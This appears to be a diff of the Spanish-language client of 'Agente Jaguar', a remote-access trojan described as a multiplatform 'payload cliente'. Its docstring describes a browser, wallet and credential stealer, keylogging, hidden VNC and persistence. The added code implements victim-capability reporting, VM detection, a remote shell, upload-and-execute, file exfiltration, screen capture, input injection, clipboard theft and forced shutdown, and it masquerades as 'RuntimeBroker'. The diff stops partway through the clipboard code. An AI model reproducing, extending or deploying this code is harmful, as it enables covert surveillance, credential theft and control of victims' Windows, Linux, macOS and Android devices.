@@ -1,23 +1,26 @@
 # -*- coding: utf-8 -*-
-"""Agente Jaguar - payload cliente (v2).
+"""Agente Jaguar - payload cliente multiplataforma (v4).
 
-Protocolo IDENTICO al controlador (jaguar/server/sesion.py + jaguar/common/cripto.py):
-  - framing: 4 bytes big-endian (longitud) + payload CIFRADO
-  - payload: JSON cifrado con cifrar()/descifrar()
-  - handshake agente->servidor: {"tipo":"hola","info":{...}}
-  - servidor->agente: {"tipo":"comando","cmd":...,"args":...} | {"tipo":"beacon",...}
-  - agente->servidor: {"tipo":"respuesta","cmd":...,"ok":...,"datos":...}
-  - agente->servidor (push): {"tipo":"evento","evento":"hvnc_frame"|"escritorio_frame","datos":{...}}
+DETECCION DE SISTEMA AL ARRANCAR:
+  _detectar_entorno() fija SO, ES_WIN/ES_LINUX/ES_MAC/ES_ANDROID y el diccionario
+  CAPS, que se publica en el handshake ("caps") para que el controlador sepa que
+  puede usar en cada victima. El registro HANDLERS es el mismo en todos los SO:
+  cada handler decide su implementacion o devuelve un error claro.
 
-NOVEDADES v2
-  - TCP_NODELAY + envio con lock -> HVNC fluido por WAN.
-  - HVNC por PID del proceso lanzado (fix Chrome/Edge/Brave), render-widget dedicado,
-    activacion WM_ACTIVATE/WM_SETFOCUS, triple fallback de captura, cache GDI.
-  - Stream push (hvnc_stream / captura_stream): cero round-trip por frame.
-  - STEALER estilo PureLogs embebido: navegadores (passwords, cookies, autofill,
-    tarjetas, historial, bookmarks), wallets, apps (FTP/SSH/mail/VPN/mensajeria),
-    WiFi, sistema, portapapeles, screenshot, keylogger -> ZIP -> exfiltracion.
-  - AES-256-GCM/CBC + 3DES en Python puro (sin cryptography).
+Cobertura:
+  Windows  -> completo (HVNC desktop oculto, DPAPI, hook de teclado, GDI)
+  Linux    -> completo salvo HVNC real (usa perfil aislado + ventana)
+  macOS    -> Linux-like (xdotool/import si estan, o basic)
+  Android  -> via Termux: screencap, input, getevent, termux-api (SMS, camara,
+              micro, GPS, sensores, contactos, llamadas, portapapeles, TTS,
+              notificaciones, vibrar, linterna, apps, persistencia Termux:Boot)
+
+Novedades v4:
+  - Rama ANDROID completa con ~38 comandos "movil_*".
+  - Captura Android por 'screencap -p' (stdout, sin permisos de storage).
+  - Keylogger Android por 'getevent -lt'.
+  - Persistencia por plataforma (Run/schtasks, systemd/crontab/bashrc, Termux:Boot).
+  - Deteccion de root Android para avisar de que el control tactil depende de el.
 """
 import base64
 import hashlib
@@ -27,6 +30,7 @@ import json
 import os
 import platform
 import random
+import re
 import shutil
 import socket
 import sqlite3
@@ -43,6 +47,145 @@ try:
 except Exception:
     getpass = None
 
+# ===========================================================================
+#  DETECCION DE ENTORNO
+# ===========================================================================
+SO_RAW = platform.system().lower()
+ES_WIN = SO_RAW.startswith("win")
+ES_LINUX = SO_RAW.startswith("linux")
+ES_MAC = SO_RAW.startswith("darwin")
+
+ES_ANDROID = bool(
+    os.environ.get("TERMUX_VERSION")
+    or os.environ.get("PREFIX", "").startswith("/data/data/com.termux")
+    or os.path.isdir("/data/data/com.termux")
+)
+
+SO = ("android" if ES_ANDROID else
+      "windows" if ES_WIN else
+      "linux" if ES_LINUX else
+      "macos" if ES_MAC else SO_RAW)
+
+CREATE_NO_WINDOW = 0x08000000
+_TERMUX_API = None
+
+
+def _tiene(binario):
+    return bool(shutil.which(binario))
+
+
+def _hay_termux_api():
+    global _TERMUX_API
+    if _TERMUX_API is None:
+        _TERMUX_API = bool(shutil.which("termux-battery-status"))
+    return _TERMUX_API
+
+
+def _es_root_android():
+    try:
+        r = subprocess.run(["su", "-c", "id"], capture_output=True, text=True,
+                           timeout=8)
+        return "uid=0" in (r.stdout or "")
+    except Exception:
+        return False
+
+
+def _android_info():
+    def _get(prop, defecto=""):
+        try:
+            r = subprocess.run(["getprop", prop], capture_output=True, text=True,
+                               timeout=6)
+            return (r.stdout or "").strip() or defecto
+        except Exception:
+            return defecto
+    return {
+        "marca": _get("ro.product.brand"),
+        "modelo": _get("ro.product.model"),
+        "fabricante": _get("ro.product.manufacturer"),
+        "android": _get("ro.build.version.release"),
+        "sdk": _get("ro.build.version.sdk"),
+        "build": _get("ro.build.display.id"),
+        "operador": _get("gsm.operator.alpha"),
+        "termux_api": _hay_termux_api(),
+        "root": _es_root_android(),
+    }
+
+
+def _detectar_entorno():
+    """Fija capacidades reales de ESTA maquina. Se envia al controlador."""
+    caps = {
+        "shell": True, "archivos": True, "captura": True, "stream": True,
+        "proxy": True, "portscan": True, "spawn": True, "descarga": True,
+        "persistencia": False, "keylogger": False, "raton": False,
+        "teclado": False, "portapapeles": False, "webcam": False,
+        "bloquear": False, "hvnc": False, "energia": False,
+        "mensaje": False, "abrir_url": False, "wifi": False,
+        "stealer_navegadores": False, "stealer_wallets": False,
+        "root": False, "entorno_grafico": False, "movil": False,
+    }
+    try:
+        caps["root"] = (os.geteuid() == 0) if hasattr(os, "geteuid") else True
+    except Exception:
+        caps["root"] = False
+
+    if ES_WIN:
+        caps.update({"persistencia": True, "keylogger": True, "raton": True,
+                     "teclado": True, "portapapeles": True, "webcam": True,
+                     "bloquear": True, "hvnc": True, "energia": True,
+                     "mensaje": True, "abrir_url": True, "wifi": True,
+                     "stealer_navegadores": True, "stealer_wallets": True,
+                     "entorno_grafico": True})
+        return caps
+
+    # ---- Linux / macOS / Android ----
+    caps["entorno_grafico"] = bool(os.environ.get("DISPLAY") or
+                                   os.environ.get("WAYLAND_DISPLAY"))
+    caps["portapapeles"] = (_tiene("xclip") or _tiene("xsel") or _tiene("wl-paste")
+                            or _tiene("termux-clipboard-get"))
+    caps["raton"] = caps["teclado"] = (_tiene("xdotool") or _tiene("ydotool")
+                                       or ES_ANDROID)
+    caps["captura"] = caps["stream"] = bool(
+        ES_ANDROID or _tiene("scrot") or _tiene("import") or _tiene("grim")
+        or _tiene("gnome-screenshot") or caps["entorno_grafico"])
+    caps["keylogger"] = (_tiene("getevent") or _tiene("xinput") or caps["root"]
+                         or os.path.isdir("/dev/input"))
+    caps["persistencia"] = (_tiene("systemctl") or _tiene("crontab") or ES_ANDROID)
+    caps["mensaje"] = (_tiene("zenity") or _tiene("notify-send")
+                       or _tiene("xmessage") or _tiene("termux-toast"))
+    caps["abrir_url"] = _tiene("xdg-open") or _tiene("open") or ES_ANDROID
+    caps["energia"] = _tiene("systemctl") or _tiene("shutdown") or ES_MAC or ES_ANDROID
+    try:
+        import cv2  # noqa
+        caps["webcam"] = True
+    except Exception:
+        caps["webcam"] = bool(_hay_termux_api())
+    caps["wifi"] = _tiene("nmcli") or _tiene("iw") or _tiene("iwconfig") or _hay_termux_api()
+    caps["stealer_navegadores"] = os.path.isdir(os.path.expanduser("~/.config"))
+    caps["stealer_wallets"] = caps["stealer_navegadores"]
+    caps["bloquear"] = _tiene("xtrlock") or _tiene("xdotool")
+
+    if ES_ANDROID:
+        caps.update({
+            "movil": True, "captura": True, "stream": True,
+            "raton": True, "teclado": True, "keylogger": True,
+            "persistencia": True, "energia": True, "abrir_url": True,
+            "webcam": bool(_hay_termux_api()),
+            "portapapeles": bool(_hay_termux_api()),
+            "mensaje": bool(_hay_termux_api()),
+            "wifi": bool(_hay_termux_api()),
+            "bloquear": False, "hvnc": False,
+            "entorno_grafico": True,
+            "stealer_navegadores": False, "stealer_wallets": False,
+            "root": _es_root_android(),
+        })
+        return caps
+
+    caps["hvnc"] = caps["entorno_grafico"]
+    return caps
+
+
+CAPS = _detectar_entorno()
+
 HOST = os.environ.get("JAGUAR_HOST", "127.0.0.1")
 try:
     PORT = int(os.environ.get("JAGUAR_PORT", "8000"))
@@ -51,13 +194,19 @@ except Exception:
 FALLBACK = os.environ.get("JAGUAR_HOST2", "")
 SLEEP = 3.0
 JITTER = 0.2
-NOMBRE = "RuntimeBroker"
-_WIN = platform.system() == "Windows"
+NOMBRE = "RuntimeBroker" if ES_WIN else "jaguar-agent"
+_WIN = ES_WIN
 
-CREATE_NO_WINDOW = 0x08000000
+_HOME = os.path.expanduser("~")
+if ES_WIN:
+    DIR_PERSIST = os.path.join(os.environ.get("APPDATA", _HOME),
+                               "Microsoft", "Windows", NOMBRE)
+else:
+    DIR_PERSIST = os.path.join(_HOME, ".local", "share", NOMBRE)
 
-DIR_PERSIST = os.path.join(os.environ.get("APPDATA", os.path.expanduser("~")),
-                           "Microsoft", "Windows", NOMBRE)
+DIR_LOG = DIR_PERSIST
+RUTA_LOG = os.path.join(DIR_LOG, "jaguar.log")
+_MAX_LOG = 1_000_000
 
 _KLOG = []
 _KLOG_ON = False
@@ -69,12 +218,13 @@ _CAP_CFG = {"calidad": 70, "escala": 1.0}
 
 _LOCK_ENVIO = threading.Lock()
 _SOCK_ACT = {"s": None}
-
 _TEMP_STEAL = None
+_STREAM = {"hvnc": {"on": False, "fps": 10},
+           "escritorio": {"on": False, "fps": 5}}
 
 
 def _sin_consola():
-    if not _WIN:
+    if not ES_WIN:
         return {}
     si = subprocess.STARTUPINFO()
     si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
@@ -82,7 +232,7 @@ def _sin_consola():
     return {"startupinfo": si, "creationflags": CREATE_NO_WINDOW}
 
 
-# ====================== CRIPTO (idéntico a jaguar/common/cripto.py) ==========
+# ====================== CRIPTO (identico al controlador) ====================
 _K_OBF = bytes([
     0x10, 0x6E, 0x1D, 0x0F, 0x6E, 0x08, 0x77, 0x68, 0x6A, 0x68,
     0x6C, 0x77, 0x39, 0x36, 0x3B, 0x2C, 0x3F, 0x77, 0x39, 0x35,
@@ -136,7 +286,7 @@ def descifrar(blob):
         raise ValueError("trama corta")
     nonce, ct, mac = blob[:16], blob[16:-32], blob[-32:]
     if not hmac.compare_digest(mac, hmac.new(_MA, nonce + ct, hashlib.sha256).digest()):
-        raise ValueError("MAC inválido")
+        raise ValueError("MAC invalido")
     cuerpo = _xor(ct, _ks(nonce, len(ct)))
     return cuerpo[2 + struct.unpack(">H", cuerpo[:2])[0]:]
 # ============================================================================
@@ -184,13 +334,6 @@ def _recibir(sock):
         return {}
 
 
-# ============================ LOG persistente ===============================
-DIR_LOG = os.path.join(os.environ.get("APPDATA", os.path.expanduser("~")),
-                       "Microsoft", "Windows", NOMBRE)
-RUTA_LOG = os.path.join(DIR_LOG, "jaguar.log")
-_MAX_LOG = 1_000_000
-
-
 def _log(nivel, txt):
     try:
         os.makedirs(DIR_LOG, exist_ok=True)
@@ -212,7 +355,57 @@ def _log_leer(a):
             return {"ruta": RUTA_LOG, "texto": "".join(f.readlines()[-n:])}
     except Exception as e:
         return {"error": str(e), "ruta": RUTA_LOG}
-# ============================================================================
+
+
+# ===========================================================================
+#  Helpers de sistema
+# ===========================================================================
+def _cmd_out(comando, timeout=25):
+    try:
+        r = subprocess.run(comando, shell=True, capture_output=True, text=True,
+                           timeout=timeout, **_sin_consola())
+        return ((r.stdout or "") + (r.stderr or "")).strip()
+    except Exception as e:
+        return f"[error] {e}"
+
+
+def _ps(comando, timeout=30):
+    if not ES_WIN:
+        return _cmd_out(comando, timeout)
+    try:
+        r = subprocess.run(["powershell", "-NoP", "-C", comando],
+                           capture_output=True, text=True, timeout=timeout,
+                           **_sin_consola())
+        return (r.stdout or "").strip() or (r.stderr or "").strip()
+    except Exception as e:
+        return f"[error] {e}"
+
+
+def _root_cmd(comando, timeout=25):
+    """Android: usa su si hay root; resto: directo."""
+    if ES_ANDROID and _es_root_android():
+        return _cmd_out(f'su -c "{comando}"', timeout)
+    return _cmd_out(comando, timeout)
+
+
+def _tx(*args, **kw):
+    """Ejecuta un comando termux-api. Devuelve (ok, texto)."""
+    try:
+        r = subprocess.run(list(args), capture_output=True, text=True,
+                           timeout=kw.get("timeout", 30))
+        return r.returncode == 0, ((r.stdout or "") + (r.stderr or "")).strip()
+    except Exception as e:
+        return False, str(e)
+
+
+def _tx_json(*args):
+    ok, txt = _tx(*args)
+    if not txt:
+        return None
+    try:
+        return json.loads(txt)
+    except Exception:
+        return None
 
 
 def _cfg():
@@ -238,27 +431,82 @@ def _ip_interna():
 
 def _usuario():
     try:
-        return getpass.getuser() if getpass else (os.environ.get("USERNAME") or "?")
+        return getpass.getuser() if getpass else (os.environ.get("USER")
+                                                  or os.environ.get("USERNAME") or "?")
     except Exception:
-        return os.environ.get("USERNAME") or "?"
+        return os.environ.get("USER") or os.environ.get("USERNAME") or "?"
+
+
+def _distro():
+    if not ES_LINUX:
+        return ""
+    try:
+        with open("/etc/os-release", encoding="utf-8", errors="replace") as f:
+            for ln in f:
+                if ln.startswith("PRETTY_NAME="):
+                    return ln.split("=", 1)[1].strip().strip('"')
+    except Exception:
+        pass
+    return platform.platform()
 
 
 def _sysinfo():
+    if ES_ANDROID:
+        a = _android_info()
+        so_txt = f"Android {a.get('android', '?')} ({a.get('marca', '')} {a.get('modelo', '')})"
+    elif ES_LINUX:
+        so_txt = _distro() or f"Linux {platform.release()}"
+    else:
+        so_txt = f"{platform.system()} {platform.release()}"
     return {
         "host": socket.gethostname(),
         "usuario": _usuario(),
-        "so": f"{platform.system()} {platform.release()}",
+        "so": so_txt,
+        "kernel": platform.release(),
         "arquitectura": platform.machine(),
         "ip": _ip_interna(),
         "pid": os.getpid(),
         "exe": sys.executable,
         "cwd": os.getcwd(),
+        "plataforma": SO,
+        "android": _android_info() if ES_ANDROID else {},
+        "caps": CAPS,
     }
+
+
+def _es_vm():
+    try:
+        if ES_WIN:
+            t = _cmd_out("wmic computersystem get model,manufacturer").lower()
+        elif ES_ANDROID:
+            return False
+        else:
+            t = _cmd_out("systemd-detect-virt").lower()
+            if not t or "none" in t:
+                with open("/sys/class/dmi/id/product_name",
+                          encoding="utf-8", errors="replace") as f:
+                    t = f.read().lower()
+        return any(k in t for k in ("vmware", "virtualbox", "vbox", "qemu", "xen",
+                                    "kvm", "hyper-v", "virtual machine", "bhyve"))
+    except Exception:
+        return False
+
+
+def _uptime():
+    try:
+        if ES_WIN:
+            return _ps("(Get-CimInstance Win32_OperatingSystem).LastBootUpTime")
+        if ES_ANDROID:
+            return _cmd_out("uptime")
+        with open("/proc/uptime") as f:
+            return f"{float(f.read().split()[0]) / 3600:.1f} h"
+    except Exception:
+        return "?"
 
 
 # ------------------------------------------------------------------ handlers
 def _ping(a):
-    return {"ts": a.get("ts")}
+    return {"ts": a.get("ts"), "so": SO}
 
 
 def _shell(a):
@@ -273,7 +521,8 @@ def _listar_dir(a):
         items = []
         for e in os.scandir(ruta):
             try:
-                items.append({"nombre": e.name, "dir": e.is_dir(), "tamano": e.stat().st_size})
+                items.append({"nombre": e.name, "dir": e.is_dir(),
+                              "tamano": e.stat().st_size})
             except Exception:
                 items.append({"nombre": e.name, "dir": e.is_dir(), "tamano": 0})
         return {"ruta": os.path.abspath(ruta), "items": items}
@@ -283,17 +532,208 @@ def _listar_dir(a):
 
 def _procesos(a):
     try:
-        r = (subprocess.run(["tasklist"], capture_output=True, text=True, **_sin_consola())
-             if _WIN else subprocess.run(["ps", "aux"], capture_output=True, text=True))
+        if ES_WIN:
+            cmd = ["tasklist"]
+        elif ES_ANDROID:
+            cmd = ["ps", "-A", "-o", "PID,USER,NAME"]
+        else:
+            cmd = ["ps", "aux"]
+        r = subprocess.run(cmd, capture_output=True, text=True, **_sin_consola())
         return {"salida": r.stdout}
     except Exception as e:
         return {"error": str(e)}
 
 
-def _captura(a):
-    fmt = (a.get("formato") or "png").lower()
-    calidad = int(a.get("calidad", _CAP_CFG["calidad"]))
-    escala = float(a.get("escala", _CAP_CFG["escala"])) or 1.0
+def _descargar(a):
+    with open(a.get("ruta", ""), "rb") as f:
+        d = f.read()
+    return {"nombre": os.path.basename(a.get("ruta", "")),
+            "b64": base64.b64encode(d).decode(), "tamano": len(d)}
+
+
+def _subir_ejecutar(a):
+    d = base64.b64decode(a.get("b64", ""))
+    ruta = os.path.join(tempfile.gettempdir(), a.get("nombre", "archivo.bin"))
+    with open(ruta, "wb") as f:
+        f.write(d)
+    try:
+        os.chmod(ruta, 0o755)
+    except Exception:
+        pass
+    try:
+        subprocess.Popen([ruta], shell=ES_WIN, **_sin_consola())
+    except Exception:
+        pass
+    return {"ruta": ruta}
+
+
+def _spawn(a):
+    exe = sys.executable if getattr(sys, "frozen", False) else os.path.abspath(sys.argv[0])
+    try:
+        subprocess.Popen([exe] + (sys.argv[1:3] if len(sys.argv) > 2 else []),
+                         **_sin_consola())
+    except Exception as e:
+        return {"error": str(e)}
+    return {"estado": "spawn", "exe": exe}
+
+
+def _energia(a):
+    modo = (a.get("modo") or "reiniciar").lower()
+    if ES_WIN:
+        cmds = {"apagar": "shutdown /s /t 5 /f", "reiniciar": "shutdown /r /t 5 /f",
+                "logoff": "shutdown /l /f", "hibernar": "shutdown /h",
+                "bloquear": "rundll32.exe user32.dll,LockWorkStation",
+                "suspender": "rundll32.exe powrprof.dll,SetSuspendState 0,1,0"}
+    elif ES_ANDROID:
+        cmds = {"apagar": "reboot -p", "reiniciar": "reboot",
+                "logoff": "am start -a android.intent.action.MAIN -c "
+                          "android.intent.category.HOME",
+                "bloquear": "input keyevent 26"}
+    elif ES_LINUX:
+        cmds = {"apagar": "systemctl poweroff", "reiniciar": "systemctl reboot",
+                "logoff": "pkill -u " + _usuario(),
+                "bloquear": "loginctl lock-session",
+                "suspender": "systemctl suspend", "hibernar": "systemctl hibernate"}
+    else:
+        cmds = {"apagar": "osascript -e 'tell app \"System Events\" to shut down'",
+                "reiniciar": "osascript -e 'tell app \"System Events\" to restart'",
+                "logoff": "osascript -e 'tell app \"System Events\" to log out'"}
+    try:
+        if ES_ANDROID:
+            _root_cmd(cmds.get(modo, cmds["reiniciar"]))
+        else:
+            subprocess.Popen(cmds.get(modo, cmds.get("reiniciar")), shell=True,
+                             **_sin_consola())
+    except Exception as e:
+        return {"error": str(e)}
+    return {"estado": modo}
+
+
+def _beacon_kill(a):
+    threading.Timer(0.4, lambda: os._exit(0)).start()
+    return {"estado": "matando proceso"}
+
+
+def _beacon_reconectar(a):
+    try:
+        _SOCK_ACT["s"].close()
+    except Exception:
+        pass
+    return {"estado": "reconectando"}
+
+
+# ===========================================================================
+#  Captura de pantalla
+# ===========================================================================
+def _tamano_png(raw):
+    try:
+        if raw[:8] == b"\x89PNG\r\n\x1a\n":
+            return (int.from_bytes(raw[16:20], "big"),
+                    int.from_bytes(raw[20:24], "big"))
+    except Exception:
+        pass
+    return 0, 0
+
+
+def _comprimir(raw, w, h, fmt="jpeg", calidad=70, escala=1.0):
+    try:
+        import cv2
+        import numpy as np
+        arr = cv2.imdecode(np.frombuffer(raw, dtype=np.uint8), cv2.IMREAD_COLOR)
+        if arr is None:
+            return raw, w, h
+        h, w = arr.shape[:2]
+        if escala != 1.0:
+            arr = cv2.resize(arr, None, fx=escala, fy=escala,
+                             interpolation=cv2.INTER_LINEAR)
+        if fmt == "jpeg":
+            ok, out = cv2.imencode(".jpg", arr,
+                                   [int(cv2.IMWRITE_JPEG_QUALITY), calidad])
+            if ok:
+                return out.tobytes(), w, h
+        return raw, w, h
+    except Exception:
+        pass
+    try:
+        from PIL import Image
+        img = Image.open(io.BytesIO(raw))
+        w, h = img.size
+        if escala != 1.0:
+            img = img.resize((max(1, int(w * escala)), max(1, int(h * escala))))
+        bio = io.BytesIO()
+        if fmt == "jpeg":
+            img.convert("RGB").save(bio, "JPEG", quality=calidad)
+        else:
+            img.save(bio, "PNG")
+        return bio.getvalue(), w, h
+    except Exception:
+        return raw, w, h
+
+
+def _captura_android(fmt="png", calidad=70, escala=1.0):
+    try:
+        r = subprocess.run(["screencap", "-p"], capture_output=True, timeout=25)
+        raw = r.stdout
+    except Exception as e:
+        return {"b64": "", "error": str(e), "w": 0, "h": 0}
+    if not raw:
+        return {"b64": "", "error": "screencap sin salida", "w": 0, "h": 0}
+    w, h = _tamano_png(raw)
+    if not w:
+        ok, salida = _tx("wm", "size")
+        m = re.search(r"(\d+)x(\d+)", salida or "")
+        if m:
+            w, h = int(m.group(1)), int(m.group(2))
+    raw, w, h = _comprimir(raw, w, h, fmt, calidad, escala)
+    return {"b64": base64.b64encode(raw).decode(), "w": w, "h": h}
+
+
+def _captura_linux(fmt="png", calidad=70, escala=1.0):
+    destino = os.path.join(tempfile.gettempdir(), "jaguar_cap." + fmt)
+    try:
+        os.remove(destino)
+    except OSError:
+        pass
+    candidatos = []
+    if os.environ.get("WAYLAND_DISPLAY") and _tiene("grim"):
+        candidatos.append(["grim", destino])
+    if _tiene("scrot"):
+        candidatos.append(["scrot", "-q", str(calidad), destino])
+    if _tiene("import"):
+        candidatos.append(["import", "-window", "root", destino])
+    if _tiene("gnome-screenshot"):
+        candidatos.append(["gnome-screenshot", "-f", destino])
+    for cmd in candidatos:
+        try:
+            subprocess.run(cmd, capture_output=True, timeout=20)
+            if os.path.isfile(destino) and os.path.getsize(destino) > 0:
+                with open(destino, "rb") as f:
+                    raw = f.read()
+                w = h = 0
+                try:
+                    from PIL import Image
+                    w, h = Image.open(io.BytesIO(raw)).size
+                except Exception:
+                    pass
+                raw, w, h = _comprimir(raw, w, h, fmt, calidad, escala)
+                return {"b64": base64.b64encode(raw).decode(), "w": w, "h": h}
+        except Exception:
+            continue
+    try:
+        from PIL import ImageGrab
+        img = ImageGrab.grab()
+        w, h = img.width, img.height
+        if escala != 1.0:
+            img = img.resize((max(1, int(w * escala)), max(1, int(h * escala))))
+        buf = io.BytesIO()
+        img.convert("RGB").save(buf, "JPEG" if fmt == "jpeg" else "PNG",
+                                **({"quality": calidad} if fmt == "jpeg" else {}))
+        return {"b64": base64.b64encode(buf.getvalue()).decode(), "w": w, "h": h}
+    except Exception as e:
+        return {"b64": "", "error": str(e)}
+
+
+def _captura_win(a, fmt="png", calidad=70, escala=1.0):
     try:
         from PIL import ImageGrab
         try:
@@ -303,7 +743,7 @@ def _captura(a):
     except Exception:
         img = None
     if img is None:
-        return _captura_win(a)
+        return _captura_win_gdi(a)
     w, h = img.width, img.height
     if escala != 1.0:
         img = img.resize((max(1, int(w * escala)), max(1, int(h * escala))))
@@ -318,7 +758,7 @@ def _captura(a):
     return {"b64": base64.b64encode(buf.getvalue()).decode(), "w": w, "h": h}
 
 
-def _captura_win(a):
+def _captura_win_gdi(a):
     import ctypes
     from ctypes import wintypes
     u = ctypes.windll.user32
@@ -361,9 +801,29 @@ def _captura_win(a):
         return {"b64": "", "w": w, "h": h}
 
 
+def _captura(a):
+    fmt = (a.get("formato") or "png").lower()
+    calidad = int(a.get("calidad", _CAP_CFG["calidad"]))
+    escala = float(a.get("escala", _CAP_CFG["escala"])) or 1.0
+    if ES_WIN:
+        return _captura_win(a, fmt, calidad, escala)
+    if ES_ANDROID:
+        return _captura_android(fmt, calidad, escala)
+    return _captura_linux(fmt, calidad, escala)
+
+
+# ===========================================================================
+#  Raton / teclado / portapapeles / bloqueo
+# ===========================================================================
 def _raton(a):
-    if not _WIN:
-        return {}
+    if ES_WIN:
+        return _raton_win(a)
+    if ES_ANDROID:
+        return _raton_android(a)
+    return _raton_xdo(a)
+
+
+def _raton_win(a):
     import ctypes
     u = ctypes.windll.user32
     accion = a.get("accion")
@@ -386,93 +846,249 @@ def _raton(a):
     return {}
 
 
+def _xdo():
+    return "xdotool" if _tiene("xdotool") else ("ydotool" if _tiene("ydotool") else "")
+
+
+def _raton_xdo(a):
+    xdo = _xdo()
+    if not xdo:
+        return {"error": "instala xdotool"}
+    accion = a.get("accion")
+    try:
+        if "x" in a and "y" in a:
+            subprocess.run([xdo, "mousemove", str(int(a["x"])), str(int(a["y"]))],
+                           capture_output=True, timeout=6)
+        boton = {"down": "1", "right_down": "3"}.get(accion)
+        subir = {"up": "1", "right_up": "3"}.get(accion)
+        if boton:
+            subprocess.run([xdo, "mousedown", boton], capture_output=True, timeout=6)
+        if subir:
+            subprocess.run([xdo, "mouseup", subir], capture_output=True, timeout=6)
+        if accion == "doble":
+            subprocess.run([xdo, "click", "--repeat", "2", "1"],
+                           capture_output=True, timeout=6)
+        if accion == "scroll":
+            b = "4" if int(a.get("delta", 120)) > 0 else "5"
+            subprocess.run([xdo, "click", "--repeat", "3", b],
+                           capture_output=True, timeout=6)
+    except Exception as e:
+        return {"error": str(e)}
+    return {}
+
+
+def _raton_android(a):
+    accion = a.get("accion")
+    x, y = int(a.get("x", 0)), int(a.get("y", 0))
+    try:
+        if accion in ("down", "right_down"):
+            _root_cmd(f"input tap {x} {y}", timeout=12)
+        elif accion == "doble":
+            _root_cmd(f"input tap {x} {y}", timeout=12)
+            time.sleep(0.12)
+            _root_cmd(f"input tap {x} {y}", timeout=12)
+        elif accion == "scroll":
+            dy = 300 if int(a.get("delta", 120)) > 0 else -300
+            _root_cmd(f"input swipe {x} {y} {x} {y + dy} 250", timeout=15)
+    except Exception as e:
+        return {"error": str(e)}
+    return {}
+
+
+def _teclado(a):
+    if ES_WIN:
+        import ctypes
+        u = ctypes.windll.user32
+        UP, UNI = 0x0002, 0x0004
+        if "vk" in a:
+            vk = int(a["vk"])
+            u.keybd_event(vk, 0, 0, 0)
+            u.keybd_event(vk, 0, UP, 0)
+        elif "texto" in a:
+            for ch in a["texto"]:
+                u.keybd_event(0, ord(ch), UNI, 0)
+                u.keybd_event(0, ord(ch), UNI | UP, 0)
+        return {}
+    if ES_ANDROID:
+        if "texto" in a:
+            txt = str(a["texto"]).replace(" ", "%s")
+            _root_cmd(f"input text '{txt}'", timeout=15)
+        elif "vk" in a:
+            _root_cmd(f"input keyevent {int(a['vk'])}", timeout=12)
+        return {}
+    xdo = _xdo()
+    if not xdo:
+        return {"error": "instala xdotool"}
+    mapa = {0x0D: "Return", 0x08: "BackSpace", 0x09: "Tab", 0x1B: "Escape",
+            0x2E: "Delete", 0x25: "Left", 0x26: "Up", 0x27: "Right", 0x28: "Down",
+            0x24: "Home", 0x23: "End", 0x20: "space"}
+    try:
+        if "vk" in a:
+            subprocess.run([xdo, "key", mapa.get(int(a["vk"]), str(int(a["vk"])))],
+                           capture_output=True, timeout=6)
+        elif "texto" in a:
+            subprocess.run([xdo, "type", "--clearmodifiers", a["texto"]],
+                           capture_output=True, timeout=10)
+    except Exception as e:
+        return {"error": str(e)}
+    return {}
+
+
 _SWAP = {"on": False}
 
 
 def _swap_raton(a):
-    if not _WIN:
-        return {}
+    if not ES_WIN:
+        return {"error": "solo Windows"}
     import ctypes
     _SWAP["on"] = not _SWAP["on"]
     ctypes.windll.user32.SwapMouseButton(1 if _SWAP["on"] else 0)
     return {"estado": "swap", "on": _SWAP["on"]}
 
 
-def _teclado(a):
-    if not _WIN:
-        return {}
-    import ctypes
-    u = ctypes.windll.user32
-    UP, UNI = 0x0002, 0x0004
-    if "vk" in a:
-        vk = int(a["vk"])
-        u.keybd_event(vk, 0, 0, 0)
-        u.keybd_event(vk, 0, UP, 0)
-    elif "texto" in a:
-        for ch in a["texto"]:
-            u.keybd_event(0, ord(ch), UNI, 0)
-            u.keybd_event(0, ord(ch), UNI | UP, 0)
-    return {}
-
-
-def _bloquear(a):
-    if not _WIN:
-        return {}
-    import ctypes
-    _BLOQ["on"] = not _BLOQ["on"]
-    try:
-        ctypes.windll.user32.BlockInput(_BLOQ["on"])
-    except Exception:
-        pass
-    return {"bloqueado": _BLOQ["on"]}
-
-
 def _clip_get(a):
-    if not _WIN:
-        return {"texto": ""}
-    import ctypes
-    u = ctypes.windll.user32
-    k = ctypes.windll.kernel32
-    CF_UNICODETEXT = 13
-    if not u.OpenClipboard(0):
-        return {"texto": ""}
-    try:
-        h = u.GetClipboardData(CF_UNICODETEXT)
-        if not h:
+    if ES_WIN:
+        import ctypes
+        u = ctypes.windll.user32
+        k = ctypes.windll.kernel32
+        if not u.OpenClipboard(0):
             return {"texto": ""}
-        p = k.GlobalLock(h)
-        txt = ctypes.wstring_at(p) if p else ""
-        k.GlobalUnlock(h)
-        return {"texto": txt}
-    finally:
-        u.CloseClipboard()
+        try:
+            h = u.GetClipboardData(13)
+            if not h:
+                return {"texto": ""}
+            p = k.GlobalLock(h)
+            txt = ctypes.wstring_at(p) if p else ""
+            k.GlobalUnlock(h)
+            return {"texto": txt}
+        finally:
+            u.CloseClipboard()
+    if ES_ANDROID:
+        ok, txt = _tx("termux-clipboard-get", timeout=15)
+        return {"texto": txt if ok else "", "error": None if ok else txt}
+    for cmd in (["wl-paste", "-n"], ["xclip", "-selection", "clipboard", "-o"],
+                ["xsel", "-b"]):
+        if _tiene(cmd[0]):
+            try:
+                r = subprocess.run(cmd, capture_output=True, text=True, timeout=8)
+                if r.returncode == 0:
+                    return {"texto": r.stdout}
+            except Exception:
+                continue
+    return {"texto": ""}
 
 
 def _clip_set(a):
-    if not _WIN:
-        return {}
-    import ctypes
-    u = ctypes.windll.user32
-    k = ctypes.windll.kernel32
-    CF_UNICODETEXT = 13
-    GMEM_MOVEABLE = 0x0002
     txt = str(a.get("texto", ""))
-    if not u.OpenClipboard(0):
+    if ES_WIN:
+        import ctypes
+        u = ctypes.windll.user32
+        k = ctypes.windll.kernel32
+        if not u.OpenClipboard(0):
+            return {}
+        try:
+            u.EmptyClipboard()
+            datos = (txt + "\x00").encode("utf-16-le")
+            h = k.GlobalAlloc(0x0002, len(datos))
+            p = k.GlobalLock(h)
+            ctypes.memmove(p, datos, len(datos))
+            k.GlobalUnlock(h)
+            u.SetClipboardData(13, h)
+        finally:
+            u.CloseClipboard()
+        return {"ok": True}
+    if ES_ANDROID:
+        ok, out = _tx("termux-clipboard-set", txt, timeout=15)
+        return {"ok": ok, "salida": out}
+    for cmd in (["wl-copy"], ["xclip", "-selection", "clipboard"], ["xsel", "-bi"]):
+        if _tiene(cmd[0]):
+            try:
+                p = subprocess.Popen(cmd, stdin=subprocess.PIPE)
+                p.communicate(txt.encode())
+                return {"ok": True}
+            except Exception:
+                continue
